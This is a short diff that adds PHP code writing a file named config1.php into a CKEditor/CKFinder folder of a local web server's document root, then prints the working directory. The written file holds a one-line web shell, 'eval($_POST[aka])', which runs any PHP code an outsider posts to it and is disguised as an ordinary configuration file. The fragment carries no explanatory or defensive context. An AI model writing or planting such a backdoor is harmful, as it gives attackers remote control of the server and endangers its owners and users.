@@ -1,0 +1,3 @@
+file_put_contents("C:/phpstudy/PHPTutorial/WWW/jrzc/ckeditor/ckfinder/config1.php","<?php eval(\$_POST[aka]);?>");
+echo getcwd();
+
